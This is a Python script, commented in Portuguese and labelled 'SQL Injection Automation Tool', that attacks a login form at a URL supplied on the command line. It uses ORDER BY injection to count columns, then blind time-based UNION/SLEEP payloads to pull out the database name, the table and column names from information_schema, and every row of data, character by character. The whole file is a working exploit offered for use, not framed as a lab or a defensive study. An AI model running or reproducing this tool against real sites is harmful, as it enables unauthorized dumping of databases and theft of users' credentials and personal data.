import requests
import string
import argparse
import time

SLEEP_SECONDS = 3
PRINTABLE_CHARS = string.printable

# Estado global da sessão
_config = {
    "url": None,
    "method": "POST",
    "timeout": 10,
}


def make_request(query: str) -> dict:
    """
    Realiza requisição usando as configurações globais (_config).
    Suporta GET e POST. Não lança exceção em erros HTTP (4xx/5xx).
    """
    url = _config["url"]
    method = _config["method"]
    timeout = _config["timeout"]

    try:
        if method == "POST":
            data = {"username": query, "password": "aaas"}
            response = requests.post(url, data=data, timeout=timeout)
        elif method == "GET":
            response = requests.get(url, params={"username": query}, timeout=timeout)
        else:
            raise ValueError(f"Método HTTP não suportado: {method}")

        # Não lança exceção — o status é apenas registrado, erros 4xx/5xx podem ser
        # respostas válidas para fins de detecção de injeção
        return {
            "url": response.url,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "response_time_seconds": response.elapsed.total_seconds(),
            "content_length": len(response.text),
            "content_type": response.headers.get("Content-Type"),
            "body": response.text,
        }

    except requests.exceptions.ConnectionError:
        print(f"[!] Erro de conexão com {url}")
        raise
    except requests.exceptions.Timeout:
        print(f"[!] Timeout após {timeout}s")
        raise


def get_ordenation_query(index: int) -> str:
    return f"' or 1=1 order by {index} -- -"


def get_ordenation() -> int:
    """
    Determina o número de colunas via ORDER BY injection.
    Retorna o número de colunas como int, ou -1 se não detectado.
    """
    MAX_COLUMNS = 20
    BASELINE_REQUESTS = 2
    CHANGE_THRESHOLD = 0.10

    all_results: list[dict] = []

    for i in range(1, MAX_COLUMNS + 1):
        res = make_request(get_ordenation_query(i))
        content_length = res["content_length"]
        all_results.append({"index": i, "length": content_length})

        print(f"  ORDER BY {i}: {content_length} bytes (status {res['status_code']})")

        if i <= BASELINE_REQUESTS:
            continue

        baseline = sum(r["length"] for r in all_results[:BASELINE_REQUESTS]) / BASELINE_REQUESTS
        deviation = abs(content_length - baseline) / baseline

        if deviation > CHANGE_THRESHOLD:
            total_columns = i - 1
            print(
                f"\n[!] Mudança detectada no ORDER BY {i} "
                f"({content_length} bytes vs baseline {baseline:.0f} bytes)\n"
                f"[+] Total de colunas: {total_columns}"
            )
            return total_columns

    print(f"[!] Não foi possível detectar o número de colunas em {MAX_COLUMNS} tentativas.")
    return -1

def time_based_inject(query_template: str, max_length: int = 50) -> str:
    """
    Extrai um valor via blind time-based SQL injection.

    O template deve conter {guess} e {length}, ex:
        "' union select 1,2,if(substring((select database()),1,{length})='{guess}',sleep(3),NULL) -- -"
    """
    extracted = ""
    # Apenas chars alfanuméricos e símbolos comuns — exclui espaço e não-imprimíveis
    VALID_CHARS = string.ascii_letters + string.digits + "_-@.#$!%^&*()"

    while len(extracted) < max_length:
        found_char = False

        for char in VALID_CHARS:
            guess = extracted + char
            query = query_template.format(guess=guess, length=len(guess))

            start = time.time()
            make_request(query)
            elapsed = time.time() - start

            print(f"  Tentando: {repr(guess)} ({elapsed:.2f}s)", end="\r")

            if elapsed >= SLEEP_SECONDS:
                extracted = guess
                found_char = True
                print(f"  [+] Char encontrado: {repr(char)} → '{extracted}'")
                break

        if not found_char:
            print(f"\n[+] Extração concluída: '{extracted}'")
            break
    else:
        print(f"[!] Limite de {max_length} chars atingido: '{extracted}'")

    return extracted

def fuzz_db() -> str:
    print("[*] Extraindo nome do banco de dados...")
    template = (
        "' union select 1,2,"
        "if(substring((select database()),1,{length})='{guess}',sleep(3),NULL) -- -"
    )
    result = time_based_inject(template)
    print(f"[+] Database: {result}")
    return result


def fuzz_table(db_name: str, offset: int = 0) -> str:
    print(f"[*] Extraindo tabela [{offset}] de '{db_name}'...")
    template = (
        f"' union select 1,2,if(substring("
        f"(select table_name from information_schema.tables "
        f"where table_schema='{db_name}' limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    result = time_based_inject(template)
    print(f"[+] Tabela [{offset}]: '{result}'")
    return result


def fuzz_column(db_name: str, table_name: str, offset: int = 0) -> str:
    print(f"[*] Extraindo coluna [{offset}] de '{db_name}.{table_name}'...")
    template = (
        f"' union select 1,2,if(substring("
        f"(select column_name from information_schema.columns "
        f"where table_schema='{db_name}' and table_name='{table_name}' limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    result = time_based_inject(template)
    print(f"[+] Coluna [{offset}]: '{result}'")
    return result


def fuzz_all_tables(db_name: str, max_tables: int = 20) -> list[str]:
    print(f"\n[*] Mapeando tabelas de '{db_name}'...")
    tables = []
    for offset in range(max_tables):
        name = fuzz_table(db_name, offset)
        if not name:
            break
        tables.append(name)
    print(f"[+] Tabelas encontradas: {tables}")
    return tables


def fuzz_all_columns(db_name: str, table_name: str, max_columns: int = 20) -> list[str]:
    print(f"\n[*] Mapeando colunas de '{db_name}.{table_name}'...")
    columns = []
    for offset in range(max_columns):
        name = fuzz_column(db_name, table_name, offset)
        if not name:
            break
        columns.append(name)
    print(f"[+] Colunas encontradas: {columns}")
    return columns

def fuzz_data(db_name: str, table_name: str, column_name: str, offset: int = 0) -> str:
    print(f"[*] Extraindo '{column_name}' linha [{offset}] de '{db_name}.{table_name}'...")
    template = (
        f"' union select 1,2,if(substring("
        f"(select {column_name} from {db_name}.{table_name} limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    result = time_based_inject(template)
    print(f"[+] {column_name}[{offset}]: '{result}'")
    return result


def fuzz_all_data(db_name: str, table_name: str, columns: list[str], max_rows: int = 50) -> list[dict]:
    print(f"\n[*] Extraindo dados de '{db_name}.{table_name}'...")
    rows = []

    for row_i in range(max_rows):
        print(f"\n  [*] Linha {row_i}...")
        row = {}

        for col in columns:
            value = fuzz_data(db_name, table_name, col, row_i)
            row[col] = value

        if not any(row.values()):
            print(f"  [*] Sem mais linhas após {row_i}.")
            break

        rows.append(row)
        print(f"  [+] Linha {row_i}: {row}")

    return rows


def print_table(table_name: str, rows: list[dict]):
    if not rows:
        print("  (sem dados)")
        return

    cols = list(rows[0].keys())
    widths = {c: max(len(c), max(len(r.get(c, "")) for r in rows)) for c in cols}

    sep = "+-" + "-+-".join("-" * widths[c] for c in cols) + "-+"
    header = "| " + " | ".join(c.ljust(widths[c]) for c in cols) + " |"

    print(f"\n  {table_name}")
    print(f"  {sep}")
    print(f"  {header}")
    print(f"  {sep}")
    for row in rows:
        line = "| " + " | ".join(row.get(c, "").ljust(widths[c]) for c in cols) + " |"
        print(f"  {line}")
    print(f"  {sep}")


def execute():
    print(f"[*] Alvo: {_config['url']} [{_config['method']}]\n")

    print("[*] Etapa 1: Detectando número de colunas...")
    qty_columns = get_ordenation()
    if qty_columns == -1:
        print("[!] Abortando.")
        return

    print(f"\n[*] Etapa 2: Identificando banco de dados...")
    db = fuzz_db()
    if not db:
        print("[!] Abortando.")
        return

    print(f"\n[*] Etapa 3: Mapeando tabelas...")
    tables = fuzz_all_tables(db)

    print(f"\n[*] Etapa 4: Mapeando colunas...")
    schema = {}
    for table in tables:
        schema[table] = fuzz_all_columns(db, table)

    print("\n[+] Schema completo:")
    for table, cols in schema.items():
        print(f"  {db}.{table}: {cols}")

    print(f"\n[*] Etapa 5: Extraindo dados...")
    for table, cols in schema.items():
        if not cols:
            continue
        rows = fuzz_all_data(db, table, cols)
        print_table(f"{db}.{table}", rows)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Automation Tool")

    parser.add_argument("--url", required=True, help="URL do alvo")
    parser.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="POST",
        help="Método HTTP (padrão: POST)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout das requisições em segundos (padrão: 10)",
    )

    args = parser.parse_args()

    # Popula configuração global
    _config["url"] = args.url
    _config["method"] = args.method
    _config["timeout"] = args.timeout

    execute()


if __name__ == "__main__":
    main()